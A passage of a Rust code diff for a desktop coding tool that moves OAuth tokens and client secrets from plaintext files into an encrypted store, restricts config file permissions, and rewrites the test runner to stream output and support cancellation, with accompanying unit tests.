@@ -7157,12 +7157,38 @@ pub async fn save_mcp_servers(servers: Vec<serde_json::Value>) -> Result<(), Str
     let text = serde_json::to_string_pretty(&servers).map_err(|e| e.to_string())?;
     let count = servers.len();
     std::fs::write(&path, text).map_err(|e| e.to_string())?;
+    restrict_to_owner(&path);
     tracing::info!(
         target: "vibecody::mcp",
         server_count = count,
         "mcp.servers.save"
     );
     Ok(())
+}
+
+/// Restrict a file to mode 0600 on Unix.
+///
+/// For files that are not themselves a credential store but can hold one: an
+/// MCP server entry carries an `env` block, and an MCP server that talks to an
+/// API wants its key in there. The tokens proper live encrypted in the
+/// ProfileStore; this keeps the config a user hand-edits from being readable by
+/// every other process on the machine. A failure is logged rather than raised —
+/// the config did save, and refusing to acknowledge that would be its own bug.
+fn restrict_to_owner(path: &std::path::Path) {
+    #[cfg(unix)]
+    {
+        use std::os::unix::fs::PermissionsExt;
+        if let Err(e) = std::fs::set_permissions(path, std::fs::Permissions::from_mode(0o600)) {
+            tracing::warn!(
+                target: "vibecody::secrets",
+                path = %path.display(),
+                error = %e,
+                "could not restrict file to owner-only; any local user may be able to read it"
+            );
+        }
+    }
+    #[cfg(not(unix))]
+    let _ = path;
 }
 
 #[derive(serde::Serialize, serde::Deserialize, Clone, Debug)]
@@ -7219,33 +7245,298 @@ pub async fn test_mcp_server(server: serde_json::Value) -> Result<Vec<McpToolInf
     result
 }
 
-// ─── MCP OAuth Commands ────────────────────────────────────────────────────────
+// ═══════════════════════════════════════════════════════════════════════════════
+// Secret maps — collections of tokens, encrypted in the ProfileStore
+// ═══════════════════════════════════════════════════════════════════════════════
 
-fn mcp_token_path() -> std::path::PathBuf {
-    let home = std::env::var("HOME").unwrap_or_else(|_| ".".to_string());
-    std::path::PathBuf::from(home)
-        .join(".vibecoder")
-        .join("mcp-tokens.json")
+/// A named collection of secrets: MCP OAuth tokens keyed by server, cloud OAuth
+/// tokens keyed by provider, OAuth client credentials keyed by provider.
+///
+/// Each entry is one encrypted row in the [`PanelStore`] under the provider key
+/// `<prefix><entry name>`, next to the API keys and integration tokens. Callers
+/// still see a `serde_json::Map`, so the OAuth flows read as they did; what
+/// changed is where the map lives.
+///
+/// All three of these were a pretty-printed JSON file under `~/.vibecoder` with
+/// whatever mode the umask gave it — access tokens, refresh tokens and OAuth
+/// client secrets in the clear, readable by any process running as the user and
+/// swept up by any backup or file-sync agent. `legacy_file` is that file: read
+/// once, written into the store, then deleted.
+struct SecretMap {
+    /// ProfileStore provider-key prefix. Ends with `.`.
+    prefix: &'static str,
+    /// The pre-encryption plaintext file, relative to `~/.vibecoder`.
+    legacy_file: &'static str,
 }
 
-fn load_mcp_tokens() -> serde_json::Map<String, serde_json::Value> {
-    let path = mcp_token_path();
-    if let Ok(text) = std::fs::read_to_string(&path) {
-        if let Ok(serde_json::Value::Object(map)) = serde_json::from_str(&text) {
-            return map;
+/// Per-server OAuth tokens for MCP servers.
+const MCP_OAUTH_TOKENS: SecretMap = SecretMap {
+    prefix: "mcp.oauth.",
+    legacy_file: "mcp-tokens.json",
+};
+
+/// Per-provider access/refresh tokens for the cloud OAuth providers.
+const CLOUD_OAUTH_TOKENS: SecretMap = SecretMap {
+    prefix: "cloud.oauth.token.",
+    legacy_file: "cloud-oauth-tokens.json",
+};
+
+/// Per-provider OAuth *client* credentials — the app's own client_id and
+/// client_secret, which is a secret in exactly the way the name says.
+const CLOUD_OAUTH_CLIENTS: SecretMap = SecretMap {
+    prefix: "cloud.oauth.client.",
+    legacy_file: "oauth-clients.json",
+};
+
+impl SecretMap {
+    fn legacy_path(&self) -> Option<std::path::PathBuf> {
+        dirs::home_dir().map(|h| h.join(".vibecoder").join(self.legacy_file))
+    }
+
+    fn provider_key(&self, name: &str) -> String {
+        format!("{}{}", self.prefix, name)
+    }
+
+    /// Every stored entry, keyed the way the callers key it.
+    ///
+    /// A store that will not open yields an empty map rather than an error: the
+    /// call sites ask "is this connected?", and when the store is unreadable
+    /// the honest answer is the same as when nothing is stored — no. Writes do
+    /// surface their errors.
+    fn load(&self) -> serde_json::Map<String, serde_json::Value> {
+        self.migrate_legacy();
+        let Ok(store) = PanelStore::new() else {
+            return serde_json::Map::new();
+        };
+        self.read_all(&store)
+    }
+
+    fn read_all(&self, store: &PanelStore) -> serde_json::Map<String, serde_json::Value> {
+        store
+            .list_api_key_providers("default")
+            .unwrap_or_default()
+            .into_iter()
+            .filter_map(|provider| {
+                let name = provider.strip_prefix(self.prefix)?.to_string();
+                let raw = store.get_api_key("default", &provider).ok().flatten()?;
+                // A row we cannot parse is a row we cannot use; it reads as
+                // absent, which is what an unusable token is.
+                Some((name, serde_json::from_str(&raw).ok()?))
+            })
+            .collect()
+    }
+
+    /// Make the stored collection equal `entries`. An entry the caller dropped
+    /// (a disconnect) is deleted, not left behind still valid.
+    fn save(&self, entries: &serde_json::Map<String, serde_json::Value>) -> Result<(), String> {
+        self.save_in(&PanelStore::new()?, entries)
+    }
+
+    fn save_in(
+        &self,
+        store: &PanelStore,
+        entries: &serde_json::Map<String, serde_json::Value>,
+    ) -> Result<(), String> {
+        entries
+            .iter()
+            .try_for_each(|(name, value)| self.write_entry(store, name, value))?;
+        let stale: Vec<String> = store
+            .list_api_key_providers("default")
+            .unwrap_or_default()
+            .into_iter()
+            .filter(|provider| {
+                provider
+                    .strip_prefix(self.prefix)
+                    .is_some_and(|name| !entries.contains_key(name))
+            })
+            .collect();
+        stale
+            .iter()
+            .try_for_each(|provider| store.delete_api_key("default", provider))
+    }
+
+    fn write_entry(
+        &self,
+        store: &PanelStore,
+        name: &str,
+        value: &serde_json::Value,
+    ) -> Result<(), String> {
+        let raw = serde_json::to_string(value).map_err(|e| e.to_string())?;
+        store.set_api_key("default", &self.provider_key(name), &raw)
+    }
+
+    /// Move a pre-encryption plaintext file into the store, once.
+    ///
+    /// The file is removed only after every entry it holds is committed to the
+    /// store — on a store failure it is still the user's only copy of tokens
+    /// they would otherwise have to re-authorise. An entry the store already
+    /// has wins: the store has been the writer since the first migration, so a
+    /// file left behind by a failed delete holds the older value.
+    fn migrate_legacy(&self) {
+        let (Some(path), Ok(store)) = (self.legacy_path(), PanelStore::new()) else {
+            return;
+        };
+        self.migrate_file_into(&store, &path);
+    }
+
+    fn migrate_file_into(&self, store: &PanelStore, path: &std::path::Path) {
+        let Ok(text) = std::fs::read_to_string(path) else {
+            return;
+        };
+        let Ok(serde_json::Value::Object(entries)) = serde_json::from_str::<serde_json::Value>(&text)
+        else {
+            // Nothing to carry over, but the bytes may still be a token, so
+            // leave the file for the user rather than deleting it for them.
+            return;
+        };
+        if entries.is_empty() {
+            let _ = std::fs::remove_file(path);
+            return;
+        }
+        let existing = self.read_all(store);
+        let written = entries
+            .iter()
+            .filter(|(name, _)| !existing.contains_key(*name))
+            .try_for_each(|(name, value)| self.write_entry(store, name, value));
+        if written.is_ok() {
+            let _ = std::fs::remove_file(path);
         }
     }
-    serde_json::Map::new()
+}
+
+#[cfg(test)]
+mod secret_map_tests {
+    use super::*;
+
+    const MAP: SecretMap = SecretMap {
+        prefix: "test.secretmap.",
+        legacy_file: "unused-in-tests.json",
+    };
+
+    /// A store on a throwaway path — never the developer's real
+    /// `~/.vibecli/profile_settings.db`.
+    fn store(dir: &tempfile::TempDir) -> PanelStore {
+        PanelStore::open_with(&dir.path().join("profile.db"), [42u8; 32]).expect("open test store")
+    }
+
+    fn entries(pairs: &[(&str, &str)]) -> serde_json::Map<String, serde_json::Value> {
+        pairs
+            .iter()
+            .map(|(k, v)| (k.to_string(), serde_json::json!({ "access_token": v })))
+            .collect()
+    }
+
+    #[test]
+    fn round_trips_entries_through_the_encrypted_store() {
+        let dir = tempfile::tempdir().unwrap();
+        let store = store(&dir);
+        let written = entries(&[("figma", "tok-a"), ("github", "tok-b")]);
+
+        MAP.save_in(&store, &written).unwrap();
+
+        assert_eq!(MAP.read_all(&store), written);
+    }
+
+    #[test]
+    fn save_deletes_an_entry_the_caller_dropped() {
+        // A disconnect must revoke the stored token, not merely stop listing it.
+        let dir = tempfile::tempdir().unwrap();
+        let store = store(&dir);
+        MAP.save_in(&store, &entries(&[("keep", "a"), ("drop", "b")]))
+            .unwrap();
+
+        MAP.save_in(&store, &entries(&[("keep", "a")])).unwrap();
+
+        let after = MAP.read_all(&store);
+        assert_eq!(after.keys().collect::<Vec<_>>(), vec!["keep"]);
+        assert!(store
+            .get_api_key("default", "test.secretmap.drop")
+            .unwrap()
+            .is_none());
+    }
+
+    #[test]
+    fn save_leaves_other_collections_alone() {
+        // The prune must be scoped to this prefix — an API key or another
+        // secret map living in the same table is not stale data.
+        let dir = tempfile::tempdir().unwrap();
+        let store = store(&dir);
+        store.set_api_key("default", "anthropic", "sk-ant").unwrap();
+
+        MAP.save_in(&store, &entries(&[("only", "a")])).unwrap();
+
+        assert_eq!(
+            store.get_api_key("default", "anthropic").unwrap().as_deref(),
+            Some("sk-ant")
+        );
+    }
+
+    #[test]
+    fn migrates_a_legacy_plaintext_file_then_deletes_it() {
+        let dir = tempfile::tempdir().unwrap();
+        let store = store(&dir);
+        let legacy = dir.path().join("legacy.json");
+        std::fs::write(
+            &legacy,
+            serde_json::to_string(&entries(&[("figma", "from-file")])).unwrap(),
+        )
+        .unwrap();
+
+        MAP.migrate_file_into(&store, &legacy);
+
+        assert_eq!(
+            MAP.read_all(&store)["figma"]["access_token"],
+            serde_json::json!("from-file")
+        );
+        assert!(!legacy.exists(), "plaintext token file must not survive");
+    }
+
+    #[test]
+    fn migration_does_not_overwrite_what_the_store_already_holds() {
+        // The store has been the writer since the first migration ran, so a
+        // file left behind by a failed delete holds the older value.
+        let dir = tempfile::tempdir().unwrap();
+        let store = store(&dir);
+        MAP.save_in(&store, &entries(&[("figma", "newer")])).unwrap();
+        let legacy = dir.path().join("legacy.json");
+        std::fs::write(
+            &legacy,
+            serde_json::to_string(&entries(&[("figma", "older")])).unwrap(),
+        )
+        .unwrap();
+
+        MAP.migrate_file_into(&store, &legacy);
+
+        assert_eq!(
+            MAP.read_all(&store)["figma"]["access_token"],
+            serde_json::json!("newer")
+        );
+    }
+
+    #[test]
+    fn unparseable_legacy_file_is_left_for_the_user() {
+        // We could not read a token out of it, but the bytes may still be one —
+        // deleting it would destroy a secret to tidy up.
+        let dir = tempfile::tempdir().unwrap();
+        let store = store(&dir);
+        let legacy = dir.path().join("legacy.json");
+        std::fs::write(&legacy, "ghp_not_json_at_all").unwrap();
+
+        MAP.migrate_file_into(&store, &legacy);
+
+        assert!(legacy.exists());
+        assert!(MAP.read_all(&store).is_empty());
+    }
+}
+
+// ─── MCP OAuth Commands ────────────────────────────────────────────────────────
+
+fn load_mcp_tokens() -> serde_json::Map<String, serde_json::Value> {
+    MCP_OAUTH_TOKENS.load()
 }
 
 fn save_mcp_tokens(tokens: &serde_json::Map<String, serde_json::Value>) -> Result<(), String> {
-    let path = mcp_token_path();
-    if let Some(parent) = path.parent() {
-        std::fs::create_dir_all(parent).map_err(|e| e.to_string())?;
-    }
-    let text = serde_json::to_string_pretty(&serde_json::Value::Object(tokens.clone()))
-        .map_err(|e| e.to_string())?;
-    std::fs::write(&path, text).map_err(|e| e.to_string())
+    MCP_OAUTH_TOKENS.save(tokens)
 }
 
 /// Build the OAuth authorization URL and open it in the system browser.
@@ -7360,33 +7651,14 @@ pub async fn get_mcp_token_status(server_name: String) -> Result<serde_json::Val
 
 // ─── Cloud OAuth Commands ──────────────────────────────────────────────────────
 
-fn cloud_oauth_token_path() -> std::path::PathBuf {
-    let home = std::env::var("HOME").unwrap_or_else(|_| ".".to_string());
-    std::path::PathBuf::from(home)
-        .join(".vibecoder")
-        .join("cloud-oauth-tokens.json")
-}
-
 fn load_cloud_oauth_tokens() -> serde_json::Map<String, serde_json::Value> {
-    let path = cloud_oauth_token_path();
-    if let Ok(text) = std::fs::read_to_string(&path) {
-        if let Ok(serde_json::Value::Object(map)) = serde_json::from_str(&text) {
-            return map;
-        }
-    }
-    serde_json::Map::new()
+    CLOUD_OAUTH_TOKENS.load()
 }
 
 fn save_cloud_oauth_tokens(
     tokens: &serde_json::Map<String, serde_json::Value>,
 ) -> Result<(), String> {
-    let path = cloud_oauth_token_path();
-    if let Some(parent) = path.parent() {
-        std::fs::create_dir_all(parent).map_err(|e| e.to_string())?;
-    }
-    let text = serde_json::to_string_pretty(&serde_json::Value::Object(tokens.clone()))
-        .map_err(|e| e.to_string())?;
-    std::fs::write(&path, text).map_err(|e| e.to_string())
+    CLOUD_OAUTH_TOKENS.save(tokens)
 }
 
 /// OAuth configuration for each cloud provider.
@@ -7886,31 +8158,17 @@ pub async fn cloud_oauth_google_profile() -> Result<serde_json::Value, String> {
 }
 
 /// Save OAuth client credentials (client_id, client_secret) for a provider.
+///
+/// Encrypted in the ProfileStore via [`CLOUD_OAUTH_CLIENTS`] — a client secret
+/// is a secret, and this pair used to sit in `~/.vibecoder/oauth-clients.json`
+/// in the clear.
 #[tauri::command]
 pub async fn cloud_oauth_save_client_config(
     provider: String,
     client_id: String,
     client_secret: String,
 ) -> Result<(), String> {
-    let path = {
-        let home = std::env::var("HOME").unwrap_or_else(|_| ".".to_string());
-        std::path::PathBuf::from(home)
-            .join(".vibecoder")
-            .join("oauth-clients.json")
-    };
-    if let Some(parent) = path.parent() {
-        std::fs::create_dir_all(parent).map_err(|e| e.to_string())?;
-    }
-    let mut configs: serde_json::Map<String, serde_json::Value> =
-        if let Ok(text) = std::fs::read_to_string(&path) {
-            if let Ok(serde_json::Value::Object(map)) = serde_json::from_str(&text) {
-                map
-            } else {
-                serde_json::Map::new()
-            }
-        } else {
-            serde_json::Map::new()
-        };
+    let mut configs = CLOUD_OAUTH_CLIENTS.load();
     configs.insert(
         provider,
         serde_json::json!({
@@ -7918,31 +8176,14 @@ pub async fn cloud_oauth_save_client_config(
             "client_secret": client_secret,
         }),
     );
-    let text = serde_json::to_string_pretty(&serde_json::Value::Object(configs))
-        .map_err(|e| e.to_string())?;
-    std::fs::write(&path, text).map_err(|e| e.to_string())
+    CLOUD_OAUTH_CLIENTS.save(&configs)
 }
 
 /// Load stored OAuth client credentials for a provider.
 #[tauri::command]
 pub async fn cloud_oauth_get_client_config(provider: String) -> Result<serde_json::Value, String> {
-    let path = {
-        let home = std::env::var("HOME").unwrap_or_else(|_| ".".to_string());
-        std::path::PathBuf::from(home)
-            .join(".vibecoder")
-            .join("oauth-clients.json")
-    };
-    let configs: serde_json::Map<String, serde_json::Value> =
-        if let Ok(text) = std::fs::read_to_string(&path) {
-            if let Ok(serde_json::Value::Object(map)) = serde_json::from_str(&text) {
-                map
-            } else {
-                serde_json::Map::new()
-            }
-        } else {
-            serde_json::Map::new()
-        };
-    Ok(configs
+    Ok(CLOUD_OAUTH_CLIENTS
+        .load()
         .get(&provider)
         .cloned()
         .unwrap_or(serde_json::json!({
@@ -8009,96 +8250,242 @@ pub async fn detect_test_framework(workspace: String) -> String {
     "unknown".to_string()
 }
 
+/// The output dialect to parse.
+///
+/// Chosen from the *command line*, not from the argv we happened to build, so a
+/// custom command (`make test-verbose`, which shells out to cargo) still gets
+/// per-test rows instead of one synthesized pass/fail.
+#[derive(Clone, Copy, PartialEq, Eq)]
+enum TestDialect {
+    Libtest,
+    Pytest,
+    GoTest,
+    Node,
+    Unknown,
+}
+
+fn dialect_of(cmd: &str) -> TestDialect {
+    let c = cmd.trim_start();
+    if c.starts_with("cargo") {
+        TestDialect::Libtest
+    } else if c.starts_with("pytest") || c.starts_with("python") {
+        TestDialect::Pytest
+    } else if c.starts_with("go test") {
+        TestDialect::GoTest
+    } else if ["npm", "yarn", "pnpm", "bun"].iter().any(|m| c.starts_with(m)) {
+        TestDialect::Node
+    } else {
+        TestDialect::Unknown
+    }
+}
+
+/// Expand a detected framework name into the command line we actually run.
+///
+/// Shell operators live here rather than in an argv list: the previous version
+/// passed `2>&1` and `|| true` to the runner as literal arguments, and `|| true`
+/// would in any case have made every run report success.
+fn detect_test_command(framework: &str) -> String {
+    match dialect_of(framework) {
+        TestDialect::Pytest => "python -m pytest -v --tb=short --no-header".to_string(),
+        TestDialect::GoTest => "go test -v ./...".to_string(),
+        TestDialect::Node if framework.starts_with("npm") => "npm test -- --json".to_string(),
+        _ => framework.to_string(),
+    }
+}
+
+/// The last `max` characters of `text`, on a character boundary.
+///
+/// A failing run puts its diagnosis at the *end*, so the head of the output is
+/// the wrong 2000 characters to keep.
+fn tail_chars(text: &str, max: usize) -> String {
+    let count = text.chars().count();
+    text.chars().skip(count.saturating_sub(max)).collect()
+}
+
+/// Cancellation for the in-flight test run — the panel's Suspend button.
+///
+/// One run at a time, which is what the panel offers. `notify_waiters` only
+/// reaches a run that is already waiting, so a click that lands before the
+/// child is spawned is a no-op rather than a queued kill.
+static TEST_CANCEL: std::sync::LazyLock<tokio::sync::Notify> =
+    std::sync::LazyLock::new(tokio::sync::Notify::new);
+
+/// Stop the running test process (and the process group it leads).
+///
+/// Suspend used to only flip a flag in the UI: the run kept going, invisibly,
+/// holding the workspace's build lock.
+#[tauri::command]
+pub async fn stop_tests() -> Result<(), String> {
+    TEST_CANCEL.notify_waiters();
+    Ok(())
+}
+
+/// Kill the whole process group the run leads.
+///
+/// Killing the `sh` alone orphans what it spawned — `make` keeps building, and
+/// the next run then blocks on the same target lock.
+async fn kill_test_group(child: &mut tokio::process::Child) {
+    #[cfg(unix)]
+    if let Some(pid) = child.id() {
+        // The child is its own group leader (`process_group(0)` below), so the
+        // negative pid addresses every descendant.
+        let _ = tokio::process::Command::new("/bin/kill")
+            .arg("-TERM")
+            .arg(format!("-{pid}"))
+            .status()
+            .await;
+    }
+    let _ = child.start_kill();
+}
+
 /// Run tests in the workspace and return parsed results.
 ///
-/// Emits `test:log` events for each output line so the frontend can show a live stream.
+/// Streams `test:log` events line by line *while the run happens* — the panel
+/// showed only the echoed command until the process exited, which for a long
+/// suite is minutes of a blank pane with no way to tell a working run from a
+/// hung one.
 #[tauri::command]
 pub async fn run_tests(
     app: tauri::AppHandle,
     workspace: String,
     command: Option<String>,
 ) -> Result<TestRunResult, String> {
+    use tokio::io::{AsyncBufReadExt, BufReader};
+
     let framework = detect_test_framework(workspace.clone()).await;
-    let cmd_str = command.unwrap_or_else(|| framework.clone());
-    if cmd_str == "unknown" {
-        return Err("Could not detect a test framework. Set a custom command.".to_string());
-    }
+    let custom = command.map(|c| c.trim().to_string()).filter(|c| !c.is_empty());
+    let (cmd_str, dialect) = match custom {
+        // A custom command runs verbatim; only its *parser* falls back to the
+        // detected framework's dialect.
+        Some(c) => {
+            let dialect = match dialect_of(&c) {
+                TestDialect::Unknown => dialect_of(&framework),
+                d => d,
+            };
+            (c, dialect)
+        }
+        None if framework == "unknown" => {
+            return Err("Could not detect a test framework. Set a custom command.".to_string());
+        }
+        None => (detect_test_command(&framework), dialect_of(&framework)),
+    };
 
     let started = std::time::Instant::now();
     let _ = app.emit("test:log", format!("$ {}", cmd_str));
 
-    let (prog, args_str) = if cmd_str.starts_with("cargo") {
-        ("cargo", "test")
-    } else if cmd_str.starts_with("bun") {
-        ("bun", "test")
-    } else if cmd_str.starts_with("yarn") {
-        ("yarn", "test --json 2>&1 || true")
-    } else if cmd_str.starts_with("npm") {
-        ("npm", "test -- --json 2>&1 || true")
-    } else if cmd_str.starts_with("pytest") {
-        ("python", "-m pytest -v --tb=short --no-header 2>&1 || true")
-    } else if cmd_str.starts_with("go test") {
-        ("go", "test -v ./... 2>&1 || true")
-    } else {
-        // custom command: run via sh
-        let output = std::process::Command::new("sh")
-            .arg("-c")
-            .arg(&cmd_str)
-            .current_dir(&workspace)
-            .output()
-            .map_err(|e| format!("Failed to run: {}", e))?;
-        let text = String::from_utf8_lossy(&output.stdout).to_string()
-            + &String::from_utf8_lossy(&output.stderr);
-        for line in text.lines() {
-            let _ = app.emit("test:log", line.to_string());
-        }
-        let elapsed = started.elapsed().as_millis() as u64;
-        let passed = if output.status.success() { 1 } else { 0 };
-        let failed = 1 - passed;
-        return Ok(TestRunResult {
-            framework: cmd_str,
-            passed,
-            failed,
-            ignored: 0,
-            total: 1,
-            duration_ms: elapsed,
-            tests: vec![TestResult {
-                name: "Test run".to_string(),
-                status: if output.status.success() {
-                    "passed".to_string()
-                } else {
-                    "failed".to_string()
-                },
-                duration_ms: Some(elapsed),
-                output: if !output.status.success() {
-                    Some(text.chars().take(2000).collect())
-                } else {
-                    None
-                },
-            }],
-        });
-    };
-
-    let output = std::process::Command::new(prog)
-        .args(args_str.split_whitespace())
+    let mut cmd = tokio::process::Command::new("sh");
+    cmd.arg("-c")
+        .arg(&cmd_str)
         .current_dir(&workspace)
-        .output()
-        .map_err(|e| format!("Failed to run {} {}: {}", prog, args_str, e))?;
+        .stdout(std::process::Stdio::piped())
+        .stderr(std::process::Stdio::piped());
+    // Its own process group, so Suspend can take the whole tree down.
+    #[cfg(unix)]
+    cmd.process_group(0);
 
-    let stdout = String::from_utf8_lossy(&output.stdout).to_string();
-    let stderr = String::from_utf8_lossy(&output.stderr).to_string();
-    let combined = format!("{}{}", stdout, stderr);
+    let mut child = cmd
+        .spawn()
+        .map_err(|e| format!("Failed to run `{}`: {}", cmd_str, e))?;
 
-    for line in combined.lines().take(500) {
-        let _ = app.emit("test:log", line.to_string());
+    let stdout = child.stdout.take().ok_or("stdout not piped")?;
+    let stderr = child.stderr.take().ok_or("stderr not piped")?;
+
+    // Both pipes feed one channel so the panel sees them interleaved in the
+    // order they were written, the way a terminal would show them.
+    let (tx, mut rx) = tokio::sync::mpsc::unbounded_channel::<(bool, String)>();
+    let out_tx = tx.clone();
+    let out_task = tokio::spawn(async move {
+        let mut lines = BufReader::new(stdout).lines();
+        while let Ok(Some(line)) = lines.next_line().await {
+            if out_tx.send((false, line)).is_err() {
+                break;
+            }
+        }
+    });
+    let err_task = tokio::spawn(async move {
+        let mut lines = BufReader::new(stderr).lines();
+        while let Ok(Some(line)) = lines.next_line().await {
+            if tx.send((true, line)).is_err() {
+                break;
+            }
+        }
+    });
+
+    // Registered before the first await so a Suspend during the run is not
+    // missed while the pump is busy emitting.
+    let cancelled = TEST_CANCEL.notified();
+    tokio::pin!(cancelled);
+    cancelled.as_mut().enable();
+
+    let mut stdout_lines: Vec<String> = Vec::new();
+    let mut all_lines: Vec<String> = Vec::new();
+    let mut suspended = false;
+    let status: Option<std::process::ExitStatus>;
+
+    loop {
+        tokio::select! {
+            // Biased: drain the output that is already queued before noticing
+            // the child exited, so the last lines of a run are never dropped.
+            biased;
+            line = rx.recv() => match line {
+                Some((is_stderr, line)) => {
+                    let _ = app.emit("test:log", line.clone());
+                    if !is_stderr {
+                        stdout_lines.push(line.clone());
+                    }
+                    all_lines.push(line);
+                }
+                // Both pipes closed: the child is done writing.
+                None => {
+                    status = child.wait().await.ok();
+                    break;
+                }
+            },
+            _ = &mut cancelled => {
+                suspended = true;
+                kill_test_group(&mut child).await;
+                status = child.wait().await.ok();
+                break;
+            }
+        }
     }
 
+    if suspended {
+        // A surviving grandchild can hold the pipes open after the shell dies,
+        // and the readers would then keep this command waiting forever.
+        out_task.abort();
+        err_task.abort();
+    }
+    let _ = out_task.await;
+    let _ = err_task.await;
+
     let elapsed = started.elapsed().as_millis() as u64;
+    let combined = all_lines.join("\n");
+    let stdout = stdout_lines.join("\n");
+    let success = status.map(|s| s.success()).unwrap_or(false);
+    let exit_code = status.and_then(|s| s.code());
+
+    let _ = app.emit(
+        "test:log",
+        if suspended {
+            format!("\nSuspended after {:.1}s", elapsed as f64 / 1000.0)
+        } else {
+            format!(
+                "\nFinished in {:.1}s (exit {})",
+                elapsed as f64 / 1000.0,
+                exit_code.map_or_else(|| "unknown".to_string(), |c| c.to_string()),
+            )
+        },
+    );
+
+    if suspended {
+        return Err("Test run suspended.".to_string());
+    }
 
     // Parse results based on framework
     let mut tests: Vec<TestResult> = Vec::new();
 
-    if prog == "cargo" {
+    if dialect == TestDialect::Libtest {
         // Parse cargo test standard libtest output:
         //   "test module::name ... ok"
         //   "test module::name ... FAILED"
@@ -8131,7 +8518,7 @@ pub async fn run_tests(
                 }
             }
         }
-    } else if prog == "python" {
+    } else if dialect == TestDialect::Pytest {
         // pytest: "test_name PASSED" or "test_name FAILED"
         for line in combined.lines() {
             let trimmed = line.trim();
@@ -8174,7 +8561,7 @@ pub async fn run_tests(
                 }
             }
         }
-    } else if prog == "go" {
+    } else if dialect == TestDialect::GoTest {
         // go test: "--- PASS: TestName (0.00s)"
         for line in combined.lines() {
             let trimmed = line.trim();
@@ -8269,21 +8656,14 @@ pub async fn run_tests(
         }
     }
 
-    // If we couldn't parse individual tests, synthesize a single result from exit code
+    // If we couldn't parse individual tests, synthesize a single result from
+    // the exit code — the only thing we actually know about the run.
     if tests.is_empty() {
         tests.push(TestResult {
             name: "Test suite".to_string(),
-            status: if output.status.success() {
-                "passed".to_string()
-            } else {
-                "failed".to_string()
-            },
+            status: if success { "passed" } else { "failed" }.to_string(),
             duration_ms: Some(elapsed),
-            output: if !output.status.success() {
-                Some(combined.chars().take(2000).collect())
-            } else {
-                None
-            },
+            output: (!success).then(|| tail_chars(&combined, 2000)),
         });
     }
 
@@ -8301,6 +8681,66 @@ pub async fn run_tests(
         duration_ms: elapsed,
         tests,
     })
+}
+
+#[cfg(test)]
+mod test_runner_tests {
+    use super::*;
+
+    // The command line is run through `sh -c`, so the shell operators the
+    // framework expansions carry have to be real shell. They used to be handed
+    // to the runner as literal argv entries (`npm test -- --json 2>&1 || true`
+    // split on whitespace), which meant npm saw `2>&1`, `||` and `true` as
+    // arguments — and `|| true` would have reported every failing run as a
+    // success anyway.
+
+    #[test]
+    fn expansions_carry_no_shell_operators() {
+        for framework in ["cargo test", "npm test", "pytest", "go test ./...", "bun test"] {
+            let cmd = detect_test_command(framework);
+            assert!(!cmd.contains("||"), "{framework} → {cmd}");
+            assert!(!cmd.contains("2>&1"), "{framework} → {cmd}");
+        }
+    }
+
+    #[test]
+    fn expansions_keep_the_verbose_flags_the_parsers_need() {
+        assert_eq!(
+            detect_test_command("pytest"),
+            "python -m pytest -v --tb=short --no-header"
+        );
+        assert_eq!(detect_test_command("go test ./..."), "go test -v ./...");
+        assert_eq!(detect_test_command("npm test"), "npm test -- --json");
+        assert_eq!(detect_test_command("cargo test"), "cargo test");
+    }
+
+    #[test]
+    fn a_custom_command_falls_back_to_the_workspace_dialect() {
+        // `make test-verbose` says nothing about its output format, so the
+        // parser comes from the detected framework — the reported case, where
+        // the run produced libtest lines and the panel showed one row.
+        assert!(dialect_of("make test-verbose") == TestDialect::Unknown);
+        assert!(dialect_of("cargo test") == TestDialect::Libtest);
+        assert!(dialect_of("cargo nextest run") == TestDialect::Libtest);
+        assert!(dialect_of("go test ./...") == TestDialect::GoTest);
+        assert!(dialect_of("pytest -q") == TestDialect::Pytest);
+        assert!(dialect_of("yarn test") == TestDialect::Node);
+    }
+
+    #[test]
+    fn failure_detail_keeps_the_end_of_the_output() {
+        // The diagnosis is at the bottom of a test log, not the top.
+        let log = format!("{}\npanicked at 'boom'", "noise\n".repeat(500));
+        let tail = tail_chars(&log, 40);
+        assert!(tail.ends_with("panicked at 'boom'"), "{tail}");
+        assert_eq!(tail.chars().count(), 40);
+    }
+
+    #[test]
+    fn tail_chars_is_char_safe_and_never_grows_the_text() {
+        assert_eq!(tail_chars("héllo", 3), "llo");
+        assert_eq!(tail_chars("hi", 10), "hi");
+    }
 }
 
 // ─── AI Commit Message (Phase 43) ─────────────────────────────────────────────
@@ -8431,11 +8871,18 @@ Respond with the commit message only, no explanation."#,
         role: vibe_ai::MessageRole::User,
         content: prompt,
     }];
-    engine
+    let reply = engine
         .chat(&messages, None)
         .await
-        .map(|r| r.trim().to_string())
-        .map_err(|e| e.to_string())
+        .map_err(|e| e.to_string())?;
+    // The reply is written into the repository verbatim, so reasoning blocks
+    // and the fence the model wrapped the message in are permanent here — two
+    // commits in this repo carry a `<thinking>` block in their subject line.
+    let message = vibe_ai::tools::sanitize_commit_message(&reply);
+    if message.is_empty() {
+        return Err("Model returned no commit message.".to_string());
+    }
+    Ok(message)
 }
 
 // ─── Checkpoint Commands ───────────────────────────────────────────────────────
@@ -9710,11 +10157,9 @@ pub async fn run_build(
         exit_code,
         duration_ms,
         errors,
-        output: if combined.len() > 4000 {
-            combined[combined.len() - 4000..].to_string()
-        } else {
-            combined
-        },
+        // Byte-sliced, this panicked on any build log whose 4000-byte mark
+        // landed mid-character — a compiler error quoting source is enough.
+        output: tail_chars(&combined, 4000),
     })
 }
 
@@ -9783,11 +10228,9 @@ pub async fn run_app(
         exit_code: status.code().unwrap_or(-1),
         duration_ms,
         errors: vec![],
-        output: if combined.len() > 4000 {
-            combined[combined.len() - 4000..].to_string()
-        } else {
-            combined
-        },
+        // Byte-sliced, this panicked on any build log whose 4000-byte mark
+        // landed mid-character — a compiler error quoting source is enough.
+        output: tail_chars(&combined, 4000),
     })
 }
 
@@ -15796,16 +16239,53 @@ pub struct SupabaseConfig {
     pub anon_key: String,
 }
 
+/// Workspace-store keys for the Supabase connection. The URL is a project
+/// setting; the anon key is a project secret, so it goes in the secrets table.
+const SUPABASE_URL_KEY: &str = "supabase.url";
+const SUPABASE_ANON_KEY: &str = "supabase.anon_key";
+
+/// The pre-encryption plaintext config, which lived *inside the checkout* at
+/// `<workspace>/.vibecoder/supabase.json` — one `git add .` from being pushed.
+fn supabase_legacy_path(workspace: &std::path::Path) -> std::path::PathBuf {
+    workspace.join(".vibecoder").join("supabase.json")
+}
+
+/// Move a legacy `supabase.json` into the encrypted [`WorkspaceStore`].
+///
+/// Returns what it migrated so the caller can answer with it on the same call.
+/// The file is deleted only once the store holds both fields.
+fn migrate_supabase_config(
